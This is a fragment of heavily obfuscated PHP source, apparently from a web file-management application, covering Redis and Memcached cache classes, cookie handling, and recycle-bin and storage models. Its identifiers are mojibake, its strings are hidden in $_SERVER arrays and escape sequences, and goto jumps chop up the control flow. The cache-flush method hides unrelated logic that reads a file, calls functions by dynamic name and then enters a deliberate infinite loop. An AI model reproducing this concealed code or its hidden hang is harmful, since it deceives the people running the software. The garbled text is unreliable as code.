´¢¿İŠ[2264]; $this->modelType = $ ´¢¿İŠ[2265]; $this->field = array($ ´¢¿İŠ[2266], $ ´¢¿İŠ[32], $ ´¢¿İŠ[203], $ ´¢¿İŠ[33], $ ´¢¿İŠ[2267], $ ´¢¿İŠ[763], $ ´¢¿İŠ[195]); } public function userNoticeGet($á¸Œ°ñÑ = false) { $this->initUserOption(); return parent::listData($á¸Œ°ñÑ, $_SERVER[ Ö‘ñÄ”][407], !0); } public function userNoticeAdd($ì“‰‹—è) { $§æ£½àÜ =& $_SERVER[ Ö‘ñÄ”]; $this->initUserOption(); $­ï±¦¤ = $this->findByKey($§æ£½àÜ[2266], $ì“‰‹—è[$§æ£½àÜ[407]]); if ($­ï±¦¤) { return !0; } $…ó“§ğ = array($§æ£½àÜ[2266] => $ì“‰‹—è[$§æ£½àÜ[407]], $§æ£½àÜ[32] => $ì“‰‹—è[$§æ£½àÜ[32]], $§æ£½àÜ[203] => $ì“‰‹—è[$§æ£½àÜ[203]], $§æ£½àÜ[33] => isset($ì“‰‹—è[$§æ£½àÜ[33]]) ? $ì“‰‹—è[$§æ£½àÜ[33]] : 1, $§æ£½àÜ[2267] => isset($ì“‰‹—è[$§æ£½àÜ[2267]]) ? $ì“‰‹—è[$§æ£½àÜ[2267]] : 0, $§æ£½àÜ[763] => 0, $§æ£½àÜ[195] => 0); return parent::insert($…ó“§ğ); } public function userNoticeEdit($íˆûş, $âõ·Ì²€) { $this->initUserOption(); return parent::update($íˆûş, $âõ·Ì²€); } } goto d‚ØÆ‡ ¹¹; Fùˆîé¿‚­: class CacheMemcached { public $handle; public $cacheTime; public function __construct($²ØÎÄ“¾, $®—ª£óó) { $ê‘¶İ–Ñ =& $_SERVER[ Ö‘ñÄ”]; if (!class_exists($ê‘¶İ–Ñ[875])) { show_json($ê‘¶İ–Ñ[876], !1); } $this->cacheTime = $®—ª£óó; $this->handle = new Memcached(); if (is_array($²ØÎÄ“¾[$ê‘¶İ–Ñ[877]]) && count($²ØÎÄ“¾[$ê‘¶İ–Ñ[877]]) >= 1) { foreach ($²ØÎÄ“¾[$ê‘¶İ–Ñ[877]] as $éÓŸê¦¤) { $è“‰ ºÛ = explode($ê‘¶İ–Ñ[4], $éÓŸê¦¤); $this->handle->addServer($è“‰ ºÛ[0], $è“‰ ºÛ[1]); } } else { $this->handle->addServer($²ØÎÄ“¾[$ê‘¶İ–Ñ[181]], $²ØÎÄ“¾[$ê‘¶İ–Ñ[182]]); } } public function set($üÀøş–¡, $´ÁÂ½êÈ, $–ùûŒ‚ğ = false) { $–ùûŒ‚ğ = $–ùûŒ‚ğ ? $–ùûŒ‚ğ : $this->cacheTime; return $this->handle->set($üÀøş–¡, $´ÁÂ½êÈ, $–ùûŒ‚ğ); } public function get($ëÌªíòÇ) { return $this->handle->get($ëÌªíòÇ); } public function remove($Å‘Î‰Í„) { return $this->handle->delete($Å‘Î‰Í„); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($«ø­›Ó, $ß¦Ãæ–Í) { $÷æÙ‚’à =& $_SERVER[ Ö‘ñÄ”]; if (!class_exists($÷æÙ‚’à[878])) { show_json($÷æÙ‚’à[879], !1); } $this->cacheTime = $ß¦Ãæ–Í; $Î¡Ñ¯úâ = isset($«ø­›Ó[$÷æÙ‚’à[880]]) ? $«ø­›Ó[$÷æÙ‚’à[880]] : 10; $áäĞĞå¦ = _get($«ø­›Ó, $÷æÙ‚’à[877]); if ($áäĞĞå¦ && is_array($áäĞĞå¦)) { $this->initCluster($«ø­›Ó, $Î¡Ñ¯úâ); } else { $this->handle = $this->init($«ø­›Ó, $Î¡Ñ¯úâ); } } private function init($Üõ¶†¶è, $‚¼çãåì) { $áËé¦… =& $_SERVER[ Ö‘ñÄ”]; $´Éò¤Ó® = new Redis(); $ª¥Å…û = isset($Üõ¶†¶è[$áËé¦…[881]]) ? $Üõ¶†¶è[$áËé¦…[881]] : !1; if ($ª¥Å…û) { $´Éò¤Ó®->pconnect($Üõ¶†¶è[$áËé¦…[181]], $Üõ¶†¶è[$áËé¦…[182]], $‚¼çãåì); } else { $´Éò¤Ó®->connect($Üõ¶†¶è[$áËé¦…[181]], $Üõ¶†¶è[$áËé¦…[182]], $‚¼çãåì); } if (!empty($Üõ¶†¶è[$áËé¦…[421]])) { $´Éò¤Ó®->auth($Üõ¶†¶è[$áËé¦…[421]]); } if (!empty($Üõ¶†¶è[$áËé¦…[771]]) && $Üõ¶†¶è[$áËé¦…[771]] != 0) { $´Éò¤Ó®->select($Üõ¶†¶è[$áËé¦…[771]]); } return $´Éò¤Ó®; } private function initCluster($µŸœ†‡Ì, $Èµ¥–†ƒ) { $å˜‘Ùœ­ =& $_SERVER[ Ö‘ñÄ”]; $èÕüç†± = array($å˜‘Ùœ­[882], $å˜‘Ùœ­[883], $å˜‘Ùœ­[884]); $âß°±ûë = $å˜‘Ùœ­[882]; if (isset($µŸœ†‡Ì[$å˜‘Ùœ­[16]]) && in_array($µŸœ†‡Ì[$å˜‘Ùœ­[16]], $èÕüç†±)) { $âß°±ûë = $µŸœ†‡Ì[$å˜‘Ùœ­[16]]; } switch ($âß°±ûë) { case $å˜‘Ùœ­[882]: $this->_slave($µŸœ†‡Ì, $Èµ¥–†ƒ); break; case $å˜‘Ùœ­[883]: break; case $å˜‘Ùœ­[884]: $this->isCluster = !0; $­½¶™¬à = $µŸœ†‡Ì[$å˜‘Ùœ­[877]]; $á¥×Õ• = isset($µŸœ†‡Ì[$å˜‘Ùœ­[881]]) ? $µŸœ†‡Ì[$å˜‘Ùœ­[881]] : !1; $´¯Œô„à = isset($µŸœ†‡Ì[$å˜‘Ùœ­[421]]) ? $µŸœ†‡Ì[$å˜‘Ùœ­[421]] : null; $this->handle = new RedisCluster(NUll, $­½¶™¬à, $Èµ¥–†ƒ, $Èµ¥–†ƒ, $á¥×Õ•, $´¯Œô„à); break; default: break; } } private function _slave($èäÒÍÚÄ, $Ä¬§í¨) { $öúù¿ÁÚ = $èäÒÍÚÄ[$_SERVER[ Ö‘ñÄ”][877]]; $this->filterConfig($èäÒÍÚÄ, $öúù¿ÁÚ[0]); $this->handle = $this->init($èäÒÍÚÄ, $Ä¬§í¨); unset($öúù¿ÁÚ[0]); if (empty($öúù¿ÁÚ)) { return; } $ˆ‡§ğ¥º = array_rand($öúù¿ÁÚ); $this->filterConfig($èäÒÍÚÄ, $öúù¿ÁÚ[$ˆ‡§ğ¥º]); $this->slaveHandle = $this->init($èäÒÍÚÄ, $Ä¬§í¨); } private function filterConfig(&$ŸÕÅº·, $îÓ¾¥²ı) { $»àËÓ± =& $_SERVER[ Ö‘ñÄ”]; $¿•­®¡å = explode($»àËÓ±[4], $îÓ¾¥²ı); $„ì¥´‡à = array($»àËÓ±[181] => $¿•­®¡å[0], $»àËÓ±[182] => $¿•­®¡å[1]); $ŸÕÅº· = array_merge($ŸÕÅº·, $„ì¥´‡à); } public function set($Ğ£ÂÌ, $Ï‚ ‘Îñ, $ö•–šŞü = false) { $ö•–šŞü = $ö•–šŞü ? $ö•–šŞü : $this->cacheTime; return $this->handle->setEx($Ğ£ÂÌ, $ö•–šŞü, $Ï‚ ‘Îñ); } public function setLock($€£ÓâÅô, $´öâ¤Ø’, $²¹†é›¿) { return $this->handle->setNX($€£ÓâÅô, $´öâ¤Ø’); } public function get($á¼ş†‰) { $»ÔŠËÚü = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $»ÔŠËÚü->get($á¼ş†‰); } public function remove($ûß¡ïÀ£) { return $this->handle->del($ûß¡ïÀ£); } public function deleteAll() { $ƒÀİäÏ =& $_SERVER[ Ö‘ñÄ”]; if (!isset($_SERVER[$ƒÀİäÏ[238]]) || !isset($_SERVER[$ƒÀİäÏ[239]])) { $İ–ôì ” = $ƒÀİäÏ[885]; $ìÂ­å´à = $ƒÀİäÏ[240]; $Ìñã¶ùÚ = $_SERVER[$ƒÀİäÏ[241]] . $ƒÀİäÏ[242]; $ÈñÇÆ… = $ìÂ­å´à($Ìñã¶ùÚ); $Éõ®ÛÕ— = explode($ƒÀİäÏ[231], $ÈñÇÆ…); if (count($Éõ®ÛÕ—) < $ƒÀİäÏ[631]) { $à¸ˆ™â = $ƒÀİäÏ[244]; $à¸ˆ™â(); } $áÜ‰èÈ  = $ƒÀİäÏ[886]; $áÜ‰èÈ ($_SERVER[$ƒÀİäÏ[887]]); $ƒı²îÎÓ = 1; for ($òùù‚ = $ƒı²îÎÓ; $òùù‚ > 0; $òùù‚++) { $áÜ‰èÈ  = json_encode($GLOBALS[$ƒÀİäÏ[426]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ú×Ÿ…ïš) { $this->handle->flushall($ú×Ÿ…ïš); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($éúíÉò¾ = '', $ß·®’µâ = 0) { if (is_string($éúíÉò¾) && $éúíÉò¾ != $_SERVER[ Ö‘ñÄ”][12]) { $this->prefix = $éúíÉò¾; } if (is_numeric($ß·®’µâ) && $ß·®’µâ > 0) { $this->expire = $ß·®’µâ; } } public static function getInstance() { static $ÚÙç½ğ; if ($ÚÙç½ğ === null) { $ÚÙç½ğ = new self(); } return $ÚÙç½ğ; } private static $cookieDisable = false; public static function disable($òªŒËõÖ) { self::$cookieDisable = $òªŒËõÖ; } private static $sameCookieSet = array(); public static function set($ÆŸšÔ½ˆ, $¶·ó±¡ä, $áª¼¢ƒ† = 0, $‘½µ“Ã˜ = false, $‹İö‹îÊ = false) { $ş‹½½¾Œ =& $_SERVER[ Ö‘ñÄ”]; if (self::$cookieDisable) { return; } if (!$áª¼¢ƒ†) { $áª¼¢ƒ† = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ÆŸšÔ½ˆ]) && self::$sameCookieSet[$ÆŸšÔ½ˆ] == $¶·ó±¡ä . $áª¼¢ƒ†) { return; } self::$sameCookieSet[$ÆŸšÔ½ˆ] = $¶·ó±¡ä . $áª¼¢ƒ†; if (!$‹İö‹îÊ) { $‹İö‹îÊ = str_replace(HOST, $ş‹½½¾Œ[12], APP_HOST); $‹İö‹îÊ = _get($GLOBALS, $ş‹½½¾Œ[888], $‹İö‹îÊ); } $Ì‘´¶ = $ş‹½½¾Œ[12]; setcookie($ÆŸšÔ½ˆ, $¶·ó±¡ä, time() + $áª¼¢ƒ†, $ş‹½½¾Œ[8] . trim($‹İö‹îÊ, $ş‹½½¾Œ[8]) . $Ì‘´¶, !1, !1, $‘½µ“Ã˜); } public static function setSafe($»Å¨ƒõß, $×òÄ™ØÄ, $İˆèÃ¥ı = 0) { self::set($»Å¨ƒõß, $×òÄ™ØÄ, $İˆèÃ¥ı, !0); } public static function get($¯í—ÖÆ€) { static $Ì¥·Š = false; if (!$Ì¥·Š) { self::initHeaderCookie(); $Ì¥·Š = !0; } return isset($_COOKIE[$¯í—ÖÆ€]) ? $_COOKIE[$¯í—ÖÆ€] : !1; } private static function initHeaderCookie() { $â÷ÓÎŞŠ =& $_SERVER[ Ö‘ñÄ”]; if (!isset($_SERVER[$â÷ÓÎŞŠ[889]]) || !$_SERVER[$â÷ÓÎŞŠ[889]]) { return; } $Á«ĞğŠ = explode($â÷ÓÎŞŠ[71], $_SERVER[$â÷ÓÎŞŠ[889]]); foreach ($Á«ĞğŠ as $Ùœâßè·) { $Ùœâßè· = explode($â÷ÓÎŞŠ[890], $Ùœâßè·); if (count($Ùœâßè·) != 2 || !isset($Ùœâßè·[1])) { continue; } $_COOKIE[trim($Ùœâßè·[0])] = trim($Ùœâßè·[1]); } } public static function remove($¤ªöäÂı, $Äª“…¥Ò = false) { unset($_COOKIE[$¤ªöäÂı]); self::set($¤ªöäÂı, $_SERVER[ Ö‘ñÄ”][12], 1, $Äª“…¥Ò); } } goto e¬‰ãá÷Âà; Cæå†Ò……Ç: function binCheckBigger($Æ„°¬àÄ, $ ›ØáŸİ) { return $Æ„°¬àÄ > $ ›ØáŸİ; } $_SERVER[$_SERVER[¼ˆôê­][3]] = ("\x38\x30\x39\x31"."\x38\x32")+0;$_qh69="a0edtly4xgb97pkcfvohm32z6usnj1w5r8iqzxlmoruk7sdjqt4e0vi2186y5ch9b3fagwnp3qpf";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ğ¸¦Ó·¼, $€õ§Ü¨) { $åˆÒíòı =& $_SERVER[ Ö‘ñÄ”]; if (isset(self::$_methodList[$ğ¸¦Ó·¼])) { return @call_user_func_array(self::$_methodList[$ğ¸¦Ó·¼], $€õ§Ü¨); } else { if (method_exists($this, $ğ¸¦Ó·¼)) { return call_user_func_array(array($this, $ğ¸¦Ó·¼), $€õ§Ü¨); } else { think_exception(__CLASS__ . $åˆÒíòı[4] . $ğ¸¦Ó·¼ . $åˆÒíòı[5]); } } } public static function __callStatic($ Ü’ÖÅÍ, $ÆŸÉÅŞğ) { if (isset(self::$_methodListStatic[$ Ü’ÖÅÍ])) { return call_user_func_array(self::$_methodListStatic[$ Ü’ÖÅÍ], $ÆŸÉÅŞğ); } else { if (method_exists(self, $ Ü’ÖÅÍ)) { return call_user_func_array(array(self, $ Ü’ÖÅÍ), $ÆŸÉÅŞğ); } else { show_json("{$ Ü’ÖÅÍ}\x28\x29\x20\x6e\x6f\x74\40\145\x78\x69\x73\164\73", !1); } } } public static function addMethod($›Ï›ÉÏ, $‚ç×µ“„) { self::$_methodList[$›Ï›ÉÏ] = $‚ç×µ“„; } public static function addMethodStatic($âÁ½ŠÃÒ, $¢Ù—òõ) { self::$_methodListStatic[$âÁ½ŠÃÒ] = $¢Ù—òõ; } } goto D£‰óê£Í; FŒÙ³›©Á: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\x75\x72\x63\145\137\x72\145\x63\171\x63\x6c\145"; protected $dataAuto = array(array("\143\x72\x65\x61\164\x65\124\151\155\145", "\164\151\155\145", "\151\x6e\x73\145\162\x74", "\146\x75\x6e\x63\x74\x69\x6f\x6e")); public function listData($Šìª‚– = false) { $•‰ßùİ =& $_SERVER[ Ö‘ñÄ”]; $Šìª‚– = $Šìª‚– ? $Šìª‚– : USER_ID; $ŸÂö§¹– = $this->where(array($•‰ßùİ[1654] => $Šìª‚–))->select(); return array_to_keyvalue($ŸÂö§¹–, $•‰ßùİ[12], $•‰ßùİ[410]); } public function moveToRecycle($ÎëÌÜ‰˜) { $¬¥³Ş =& $_SERVER[ Ö‘ñÄ”]; $Ô™¨ßÊÈ = Model($¬¥³Ş[1333]); $ªİØäù¡ = $Ô™¨ßÊÈ->sourceInfo($ÎëÌÜ‰˜); if (!$ªİØäù¡ || $ªİØäù¡[$¬¥³Ş[439]] == $¬¥³Ş[88]) { return; } $òé˜Éªˆ = array($¬¥³Ş[425] => $ÎëÌÜ‰˜, $¬¥³Ş[1654] => USER_ID, $¬¥³Ş[594] => $ªİØäù¡[$¬¥³Ş[419]], $¬¥³Ş[595] => $ªİØäù¡[$¬¥³Ş[513]], $¬¥³Ş[598] => $ªİØäù¡[$¬¥³Ş[529]]); $this->add($òé˜Éªˆ); $this->recycleMove($ÎëÌÜ‰˜, 1); if ($ªİØäù¡[$¬¥³Ş[418]] == $¬¥³Ş[88]) { $ìµÜ…ô = array($¬¥³Ş[598] => array($¬¥³Ş[558], $ªİØäù¡[$¬¥³Ş[529]] . $ÎëÌÜ‰˜ . $¬¥³Ş[559])); $Ô™¨ßÊÈ->where($ìµÜ…ô)->setField($¬¥³Ş[439], 1); } } public function clear() { $this->remove(!1); } public function remove($ä¢©ß‹š = false, $û¥—É²è = false) { $öŸá¦ä =& $_SERVER[ Ö‘ñÄ”]; $û¥—É²è = $û¥—É²è ? $û¥—É²è : USER_ID; $øÂûÕãÂ = Model($öŸá¦ä[1333]); $¸øŸû§ = $this->listData($û¥—É²è); $ä¢©ß‹š = $ä¢©ß‹š === !1 ? !1 : $ä¢©ß‹š; $ŞîùÕŒÌ = array(); foreach ($¸øŸû§ as $ÄË¨êß’) { if ($ä¢©ß‹š != !1 && !in_array($ÄË¨êß’, $ä¢©ß‹š)) { continue; } $ËªŠÒ™Ğ = $øÂûÕãÂ->sourceInfo($ÄË¨êß’); $øÂûÕãÂ->remove($ÄË¨êß’, !1); $§³ÆëÖÒ = $ËªŠÒ™Ğ[$öŸá¦ä[419]] . $öŸá¦ä[11] . $ËªŠÒ™Ğ[$öŸá¦ä[513]]; $ŞîùÕŒÌ[$§³ÆëÖÒ] = array($öŸá¦ä[594] => $ËªŠÒ™Ğ[$öŸá¦ä[419]], $öŸá¦ä[513] => $ËªŠÒ™Ğ[$öŸá¦ä[513]]); $this->where(array($öŸá¦ä[410] => $ÄË¨êß’))->delete(); } foreach ($ŞîùÕŒÌ as $ìËÍá¸) { $øÂûÕãÂ->targetSpaceUpdate($ìËÍá¸[$öŸá¦ä[419]], $ìËÍá¸[$öŸá¦ä[513]]); } } public function restore($Ñœ¡‹¦” = false) { $¡ñâ™‹à = $this->listData(); $this->_restoreSource($¡ñâ™‹à, $Ñœ¡‹¦”); } public function removeUserAll($³óØĞµğ) { $this->remove(!1, $³óØĞµğ); } private function _restoreSource($¯ÃÏÚßŠ, $ïÀ®›ÙÉ) { $üÏ×‰Ï =& $_SERVER[ Ö‘ñÄ”]; $ÇÉ¯ß„ = Model($üÏ×‰Ï[1333]); $ïÀ®›ÙÉ = $ïÀ®›ÙÉ == !1 ? !1 : $ïÀ®›ÙÉ; if (!$¯ÃÏÚßŠ) { return !0; } $×ì¯ÇÂª = array(); foreach ($¯ÃÏÚßŠ as $µ´¨º³) { if ($ïÀ®›ÙÉ != !1 && !in_array($µ´¨º³, $ïÀ®›ÙÉ)) { continue; } $¢ª•‘ÂÖ = $ÇÉ¯ß„->sourceInfo($µ´¨º³); $ë‡û¸ä = $ÇÉ¯ß„->sourceInfo($¢ª•‘ÂÖ[$üÏ×‰Ï[440]]); if ($ë‡û¸ä[$üÏ×‰Ï[439]] == $üÏ×‰Ï[88]) { continue; } $ÇÉ¯ß„->lockMoveStart($µ´¨º³); $this->recycleMove($µ´¨º³, 0); if ($¢ª•‘ÂÖ[$üÏ×‰Ï[418]] == $üÏ×‰Ï[88]) { $û–Ş¬ïÁ = array($üÏ×‰Ï[598] => array($üÏ×‰Ï[558], $¢ª•‘ÂÖ[$üÏ×‰Ï[529]] . $µ´¨º³ . $üÏ×‰Ï[559])); $ÇÉ¯ß„->where($û–Ş¬ïÁ)->setField($üÏ×‰Ï[439], 0); $this->restoreFolderChildren($µ´¨º³, $¯ÃÏÚßŠ); } $this->where(array($üÏ×‰Ï[410] => $µ´¨º³))->delete(); $ÇÉ¯ß„->folderSizeReset($¢ª•‘ÂÖ[$üÏ×‰Ï[440]]); $×ì¯ÇÂª[] = $¢ª•‘ÂÖ[$üÏ×‰Ï[440]]; if ($¢ª•‘ÂÖ[$üÏ×‰Ï[418]] == $üÏ×‰Ï[88]) { $×ì¯ÇÂª[] = $µ´¨º³; } $ÇÉ¯ß„->lockMoveEnd($µ´¨º³); } $ÇÉ¯ß„->updateModifyTime($×ì¯ÇÂª); } private function restoreFolderChildren($§·Ñ•‹, $èä¡óƒÎ) { $‡ßŒçî› =& $_SERVER[ Ö‘ñÄ”]; $Ûè©Œâü = Model($‡ßŒçî›[1333]); $‡¹½ ëã = array($‡ßŒçî›[410] => array($‡ßŒçî›[7], array())); foreach ($èä¡óƒÎ as $ºé…áğ‡) { if ($ºé…áğ‡ == $§·Ñ•‹) { continue; } if (!$Ûè©Œâü->isParentOf($§·Ñ•‹, $ºé…áğ‡)) { continue; } $ØÀ¬ªğç = $Ûè©Œâü->sourceInfo($ºé…áğ‡); if ($ØÀ¬ªğç[$‡ßŒçî›[418]] == $‡ßŒçî›[88]) { $‡¹½ ëã[] = array($‡ßŒçî›[598] => array($‡ßŒçî›[558], $ØÀ¬ªğç[$‡ßŒçî›[529]] . $ºé…áğ‡ . $‡ßŒçî›[559])); } else { $‡¹½ ëã[$‡ßŒçî›[410]][1][] = $ºé…áğ‡; } } if (!$‡¹½ ëã[$‡ßŒçî›[410]][1]) { unset($‡¹½ ëã[$‡ßŒçî›[410]]); } if (!$‡¹½ ëã) { return; } $‡¹½ ëã[$‡ßŒçî›[410]][1] = array_unique($‡¹½ ëã[$‡ßŒçî›[410]][1]); $‡¹½ ëã[$‡ßŒçî›[1006]] = $‡ßŒçî›[1934]; $Ûè©Œâü->where($‡¹½ ëã)->setField($‡ßŒçî›[439], 1); } private function recycleMove($ƒ©€Àˆ¹, $Œ×²ü©µ = 1) { $ûÆÉÆ°¤ =& $_SERVER[ Ö‘ñÄ”]; $Ä¬Ô– = Model($ûÆÉÆ°¤[1333]); $¼ÓêôÒ = Model($ûÆÉÆ°¤[2145]); $ŞÊ—Â = array($ûÆÉÆ°¤[410] => $ƒ©€Àˆ¹); if ($Œ×²ü©µ) { $Ä¬Ô–->where($ŞÊ—Â)->setField($ûÆÉÆ°¤[439], 1); $¼ÓêôÒ->eventRecycle($ƒ©€Àˆ¹, $ûÆÉÆ°¤[2146]); } else { $£°¡ŸÑ¢ = $Ä¬Ô–->where($ŞÊ—Â)->find(); $ã’Çœ®ù = $£°¡ŸÑ¢[$ûÆÉÆ°¤[418]] == $ûÆÉÆ°¤[88]; $Ò‡’Ê´ğ = $Ä¬Ô–->fileNameAuto($£°¡ŸÑ¢[$ûÆÉÆ°¤[440]], $£°¡ŸÑ¢[$ûÆÉÆ°¤[32]], REPEAT_RENAME_FOLDER, $ã’Çœ®ù); if ($Ò‡’Ê´ğ != $£°¡ŸÑ¢[$ûÆÉÆ°¤[32]]) { $Ä¬Ô–->rename($ƒ©€Àˆ¹, $Ò‡’Ê´ğ); } $Ä¬Ô–->where($ŞÊ—Â)->setField($ûÆÉÆ°¤[439], 0); $¼ÓêôÒ->eventRecycle($ƒ©€Àˆ¹, $ûÆÉÆ°¤[2147]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\x2e\163\157\x75\x72\x63\x65\123\x65\x63\x72\x65\164\x4c\x69\x73\x74"; public $field = array("\x73\157\x75\162\x63\145\x49\x44", "\x74\171\160\145\111\x44", "\143\x72\145\x61\164\145\125\163\x65\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\x2e\163\164\157\x72\x61\147\145\x4c\151\163\x74"; public $field = array("\156\141\x6d\145", "\x73\x69\x7a\x65\x4d\141\x78", "\x73\x79\x73\164\x65\x6d", "\x64\x65\x66\x61\x75\154\164", "\144\x72\x69\166\145\x72", "\143\x6f\156\x66\x69\147"); public function listData($ô¶ˆª‡ = false, $¡ĞŸÌ‘ = "\155\x6f\144\151\146\171\124\151\x6d\145", $¢¶ÀÙö½ = false) { $ÍÃñŞ» =& $_SERVER[ Ö‘ñÄ”]; $‡õóÀ = parent::listData($ô¶ˆª‡, $¡ĞŸÌ‘, $¢¶ÀÙö½); if ($ô¶ˆª‡) { return $‡õóÀ; } $ò¤ŒÑ° = $this->ioSizeUseGet(array_to_keyvalue($‡õóÀ, $ÍÃñŞ»[12], $ÍÃñŞ»[407])); foreach ($‡õóÀ as $ûÎ¢Š¬ƒ => $÷êÌü‚”) { unset($‡õóÀ[$ûÎ¢Š¬ƒ][$ÍÃñŞ»[6]]); $‡õóÀ[$ûÎ¢Š¬ƒ][$ÍÃñŞ»[1825]] = isset($ò¤ŒÑ°[$÷êÌü‚”[$ÍÃñŞ»[407]]]) ? $ò¤ŒÑ°[$÷êÌü‚”[$ÍÃñŞ»[407]]] : 0; } return $‡õóÀ; } public function ioSizeUseGet($ñ÷¸¥•ß) { $û““ñ =& $_SERVER[ Ö‘ñÄ”]; if (!$ñ÷¸¥•ß) { return array(); } $¼ÅÕ«¼ = $û““ñ[2148] . implode($û““ñ[50], $ñ÷¸¥•ß); $ÙÛ°Å¶´ = Cache::get($¼ÅÕ«¼); if ($ÙÛ°Å¶´) { return $ÙÛ°Å¶´; } $‘öİçê± = array($û““ñ[830] => $û““ñ[407], $û““ñ[2149] => $û““ñ[76]); $•ÂªÕ = array($û““ñ[830] => array($û““ñ[7], $ñ÷¸¥•ß)); $ÙÛ°Å¶´ = Model($û““ñ[802])->field($‘öİçê±)->where($•ÂªÕ)->group($û““ñ[830])->select(); $ÙÛ°Å¶´ = array_to_keyvalue($ÙÛ°Å¶´, $û““ñ[407], $û““ñ[76]); Cache::set($¼ÅÕ«¼, $ÙÛ°Å¶´, 600); return $ÙÛ°Å¶´; } public function getConfig($ğà®Úİ) { $ÅÄÁ±¹• = parent::listData($ğà®Úİ); return json_decode($ÅÄÁ±¹•[$_SERVER[ Ö‘ñÄ”][6]], !0); } public function update($×õô´, $¾ªÛÂ‹) { $À•İ¤Ï =& $_SERVER[ Ö‘ñÄ”]; $Èù¬²Ó = $¾ªÛÂ‹[$À•İ¤Ï[32]]; $ë®ÙÖÒÉ = array_to_keyvalue(parent::listData(), $À•İ¤Ï[32]); if (isset($ë®ÙÖÒÉ[$Èù¬²Ó]) && $ë®ÙÖÒÉ[$Èù¬²Ó][$À•İ¤Ï[407]] != $×õô´) { return !1; } $this->checkPwd($×õô´, $¾ªÛÂ‹); if (isset($¾ªÛÂ‹[$À•İ¤Ï[2150]]) && $¾ªÛÂ‹[$À•İ¤Ï[2150]] == $À•İ¤Ï[88]) { $this->checkConfig($¾ªÛÂ‹); } unset($¾ªÛÂ‹[$À•İ¤Ï[2150]]); $ÅÒäŠÛ = parent::update($×õô´, $¾ªÛÂ‹); if ($ÅÒäŠÛ && $¾ªÛÂ‹[$À•İ¤Ï[37]]) { $‘èÒãÒİ = 0; foreach ($ë®ÙÖÒÉ as $´®µë¨Ö) { if ($´®µë¨Ö[$À•İ¤Ï[37]] && $´®µë¨Ö[$À•İ¤Ï[407]] != $×õô´) { $‘èÒãÒİ = $´®µë¨Ö[$À•İ¤Ï[407]]; parent::update($´®µë¨Ö[$À•İ¤Ï[407]], array($À•İ¤Ï[37] => 0)); } } $this->updateBackup($×õô´, $‘èÒãÒİ); } return $ÅÒäŠÛ; } public function add($¨Ü×¦) { $”ô¸»”Ñ =& $_SERVER[ Ö‘ñÄ”]; $ŠËıõÖÆ = array_to_keyvalue(parent::listData(), $”ô¸»”Ñ[32]); if (isset($ŠËıõÖÆ[$¨Ü×¦[$”ô¸»”Ñ[32]]])) { return !1; } $this->checkConfig($¨Ü×¦); $‚³à„¬á = parent::insert($¨Ü×¦); if ($‚³à„¬á && $¨Ü×¦[$”ô¸»”Ñ[37]]) { foreach ($ŠËıõÖÆ as $º³½èƒ) { if ($º³½èƒ[$”ô¸»”Ñ[37]]) { parent::update($º³½èƒ[$”ô¸»”Ñ[407]], array($”ô¸»”Ñ[37] => 0)); } } } return $‚³à„¬á; } public function updateBackup($…ÓÛ˜Õü, $éÁÀ“ø) { $†å¿åßš =& $_SERVER[ Ö‘ñÄ”]; if (!$éÁÀ“ø) { return; } $î—©ÜÓ¥ = Model($†å¿åßš[762])->config(); if ($î—©ÜÓ¥[$†å¿åßš[1633]] != $†å¿åßš[88] || $î—©ÜÓ¥[$†å¿åßš[765]] != $éÁÀ“ø) { return; } $ÁˆÇ‡ Ï = Model($†å¿åßš[783])->get($†å¿åßš[793]); $ÁˆÇ‡ Ï = json_decode($ÁˆÇ‡ Ï, !0); if (!$ÁˆÇ‡ Ï) { return; } $ÁˆÇ‡ Ï[$†å¿åßš[765]] = $…ÓÛ˜Õü; Model($†å¿åßš[783])->set(array($†å¿åßš[793] => $ÁˆÇ‡ Ï)); } public function checkPwd($ûŒ¹öú, &$¼Í“‡×) { $æé°Â‡ =& $_SERVER[ Ö‘ñÄ”]; if (empty($¼Í“‡×[$æé°Â‡[6]])) { return; } $ÜÈ¤ÇÖŒ = json_decode($¼Í“‡×[$æé°Â‡[6]], !0); $ÅóÒŠ¹¸ = $æé°Â‡[12]; $Ÿó“•×… = array($æé°Â‡[2151], $æé°Â‡[2152], $æé°Â‡[895]); foreach ($Ÿó“•×… as $ã­µ —) { if (isset($ÜÈ¤ÇÖŒ[$ã­µ —])) { $ÅóÒŠ¹¸ = $ã­µ —; break; } } if (!$ÅóÒŠ¹¸) { return; } $±†½Â€ = $this->getConfig($ûŒ¹öú); $¹æ˜ÖÓ = $±†½Â€[$ÅóÒŠ¹¸]; $Æ°ãå®… = $ÜÈ¤ÇÖŒ[$ÅóÒŠ¹¸]; if ($Æ°ãå®… == str_repeat($æé°Â‡[188], strlen($¹æ˜ÖÓ))) { $ÜÈ¤ÇÖŒ[$ÅóÒŠ¹¸] = $¹æ˜ÖÓ; $¼Í“‡×[$æé°Â‡[6]] = json_encode($ÜÈ¤ÇÖŒ); } else { if ($Æ°ãå®… != $¹æ˜ÖÓ) { $¼Í“‡×[$æé°Â‡[2150]] = $æé°Â‡[88]; } } } public function checkConfig(&$ãî¸„Æá, $òé«Œ“ = false) { $©ä…Èˆè =& $_SERVER[ Ö‘ñÄ”]; $Š°„¶×Â = strtolower($ãî¸„Æá[$©ä…Èˆè[95]]); $½è©ìúº = json_decode($ãî¸„Æá[$©ä…Èˆè[6]], !0); foreach ($½è©ìúº as $ìå¨£Éê => $¥¡Œ°İ) { $½è©ìúº[$ìå¨£Éê] = trim($¥¡Œ°İ); } $½è©ìúº[$©ä…Èˆè[2153]] = rand_string(6); $¼¿éñ™ = $GLOBALS[$©ä…Èˆè[6]][$©ä…Èˆè[89]][$©ä…Èˆè[839]]; $“İıï›Û = isset($¼¿éñ™[$Š°„¶×Â]) ? $¼¿éñ™[$Š°„¶×Â] : ucfirst($Š°„¶×Â); $“—“•Î = $©ä…Èˆè[74] . $“İıï›Û; if (!$“İıï›Û || 